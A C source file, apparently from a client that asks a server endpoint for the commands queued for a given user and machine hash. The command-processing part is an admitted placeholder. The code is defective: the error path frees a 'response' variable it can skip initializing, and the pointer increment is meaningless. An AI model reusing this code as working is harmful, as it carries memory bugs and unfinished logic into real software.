#include "list_commands.h"

#include <stdlib.h>

#include "logger/logger.h"
#include "sock/sock.h"
#include "sock/sockutils.h"
#include "utils/errors.h"
#include "utils/stringbuilder.h"

static int list_commands_prepare(struct settings *settings, struct sock **out)
{
    struct string url = NULL_STRING;
    struct string content = NULL_STRING;
    int err = SUCCESS;

    char *url_arr[] = {
        "/api/list_commands.php?user=",
        settings->user_hash,
        "&machine=",
        settings->machine_hash,
        NULL,
    };
    url = concat_str(url_arr);
    if (url.data == NULL)
    {
        err = FATAL;
        goto error;
    }

    struct sock *sock = sock_request(settings, "GET", url.data, NULL_STRING);
    if (sock == NULL)
    {
        err = ERROR;
        goto error;
    }

    *out = sock;

error:
    STRING_FREE(url);
    STRING_FREE(content);

    return err;
}

int list_commands(struct settings *settings, struct queue *queue)
{
    struct sock *sock = NULL;
    int err = list_commands_prepare(settings, &sock);
    if (err != SUCCESS)
    {
        goto end;
    }

    struct string response = recv_content(sock);
    if (response.data == NULL)
    {
        err = ERROR;
        goto end;
    }

    if (STRSTARTSWITH(response.data, "error"))
    {
        log_error("%s", response.data);
        goto end;
    }
    else {
        // found commands, now list and categorize them
        // will assume they are well formed

        while (1) {
            log_info("temporary, skipping reading all commands");
            queue++;
            break;
        }
    }

end:
    sock_destroy(sock);
    STRING_FREE(response);
    return err;
}
